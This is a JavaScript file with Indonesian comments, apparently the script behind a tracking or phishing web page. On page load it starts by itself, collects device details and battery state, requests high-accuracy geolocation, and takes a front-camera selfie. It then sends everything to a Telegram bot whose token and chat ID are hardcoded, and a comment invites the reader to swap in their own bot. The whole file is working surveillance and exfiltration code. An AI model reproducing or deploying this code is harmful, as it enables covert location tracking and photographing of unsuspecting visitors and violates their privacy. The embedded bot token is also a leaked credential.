const statusList = document.getElementById('status-list');
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');

// Ubah sesuai bot kamu
const botToken = '6598957548:AAFd8OLzgH-ageyLfDGDxrEhoIS5CuHJ_sc';
const chatId = '1265481161';

const updateStatus = (message, isError = false) => {
  const li = document.createElement('li');
  li.textContent = message;
  if (isError) li.className = 'error';
  statusList.appendChild(li);
  statusList.scrollTop = statusList.scrollHeight;
};

const getDeviceInfo = () => {
  updateStatus('1. Mengambil info perangkat...');
  const data = {
    userAgent: navigator.userAgent,
    platform: navigator.platform || 'N/A',
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
  };

  if (navigator.getBattery) {
    return navigator.getBattery().then(battery => {
      data.battery = {
        level: Math.round(battery.level * 100) + '%',
        isCharging: battery.charging
      };
      return data;
    });
  } else {
    data.battery = { level: 'N/A', isCharging: 'N/A' };
    return Promise.resolve(data);
  }
};

const getLocation = () => {
  updateStatus('2. Mengambil lokasi...');
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocation tidak tersedia.'));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      position => {
        resolve({
          lat: position.coords.latitude,
          lon: position.coords.longitude,
          accuracy: position.coords.accuracy
        });
      },
      error => reject(new Error(`Gagal mendapatkan lokasi: ${error.message}`)),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
};

const getPhoto = async () => {
  updateStatus('3. Mengambil foto...');
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
  videoEl.srcObject = stream;
  await new Promise(resolve => videoEl.onloadedmetadata = resolve);
  videoEl.play();
  await new Promise(resolve => setTimeout(resolve, 500));
  canvasEl.width = videoEl.videoWidth;
  canvasEl.height = videoEl.videoHeight;
  const context = canvasEl.getContext('2d');
  context.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
  const photoBase64 = canvasEl.toDataURL('image/jpeg', 0.7);
  stream.getTracks().forEach(track => track.stop());
  videoEl.srcObject = null;
  return photoBase64;
};

const sendToTelegram = async (data) => {
  const message = `
📱 *Perangkat*
• UA: ${data.deviceInfo.userAgent}
• Platform: ${data.deviceInfo.platform}
• Resolusi: ${data.deviceInfo.screenWidth}x${data.deviceInfo.screenHeight}
• Baterai: ${data.deviceInfo.battery.level}, Charging: ${data.deviceInfo.battery.isCharging}
  `.trim();

  // Kirim teks info perangkat
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    })
  });

  // Kirim lokasi sebagai share-location
  await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      latitude: data.location.lat,
      longitude: data.location.lon
    })
  });

  // Kirim selfie (foto)
  const blob = await (await fetch(data.photoBase64)).blob();
  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('photo', blob, 'selfie.jpg');

  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: 'POST',
    body: formData
  });
};

const start = async () => {
  updateStatus('Memulai proses...');
  try {
    const data = {};
    data.deviceInfo = await getDeviceInfo();
    updateStatus('✅ Info perangkat OK');
    data.location = await getLocation();
    updateStatus('✅ Lokasi OK');
    data.photoBase64 = await getPhoto();
    updateStatus('✅ Foto OK');
    await sendToTelegram(data);
    updateStatus('✅ Semua data berhasil dikirim ke Telegram.');
  } catch (err) {
    console.error(err);
    updateStatus(`❌ Error: ${err.message}`, true);
  }
};

// Jalankan otomatis setelah halaman siap
window.addEventListener('DOMContentLoaded', () => {
  start();
});
